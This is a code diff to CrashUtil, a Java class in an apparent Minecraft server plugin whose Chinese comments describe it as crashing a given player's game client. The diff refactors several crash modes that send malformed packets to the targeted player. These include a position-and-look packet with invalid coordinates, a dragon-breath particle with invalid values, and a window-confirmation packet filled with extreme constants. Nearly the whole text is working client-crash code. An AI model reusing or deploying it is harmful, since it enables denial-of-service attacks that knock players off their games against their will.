@@ -15,6 +15,20 @@ import java.util.Collections;
 
 public final class CrashUtil {
     /**
+     * 给指定玩家实例发送确认数据包
+     *
+     * @param player 玩家实例
+     */
+    private static void sendConfirmPacket(Player player) {
+        Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
+                new WrapperPlayServerWindowConfirmation(
+                        Float.MAX_EXPONENT,
+                        Short.MAX_VALUE,
+                        false)
+        );
+    }
+
+    /**
      * 崩溃指定玩家实例的客户端
      *
      * @param player    玩家实例
@@ -32,28 +46,32 @@ public final class CrashUtil {
                                 new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook())
                         )
                 );
-                Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
-                        new WrapperPlayServerWindowConfirmation(
-                                Float.MAX_EXPONENT,
-                                Short.MAX_VALUE,
-                                false)
-                );
+
+                sendConfirmPacket(player);
             }
-            case "posAndLook" -> Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
-                    new WrapperPlayServerPlayerPositionAndLook(
-                            generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition(),
-                            generateInvalidLook(), generateInvalidLook(),
-                            generateFlags(), generateTeleportID(), false
-                    )
-            );
-            case "invalidParticle" -> Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
-                    new WrapperPlayServerParticle(
-                            new Particle<>(ParticleTypes.DRAGON_BREATH), true,
-                            new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
-                            new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook()),
-                            generateInvalidLook(), generateTeleportID()
-                    )
-            );
+            case "invalidTeleport" -> {
+                Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
+                        new WrapperPlayServerPlayerPositionAndLook(
+                                generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition(),
+                                generateInvalidLook(), generateInvalidLook(),
+                                generateFlags(), generateTeleportID(), false
+                        )
+                );
+
+                sendConfirmPacket(player);
+            }
+            case "invalidParticle" -> {
+                Main.instance.getPluginHookManager().getPacketEventsHook().sendPacket(player,
+                        new WrapperPlayServerParticle(
+                                new Particle<>(ParticleTypes.DRAGON_BREATH), true,
+                                new Vector3d(generateInvalidPosition(), generateInvalidPosition(), generateInvalidPosition()),
+                                new Vector3f(generateInvalidLook(), generateInvalidLook(), generateInvalidLook()),
+                                generateInvalidLook(), generateTeleportID()
+                        )
+                );
+
+                sendConfirmPacket(player);
+            }
             default -> {
                 return false;
             }
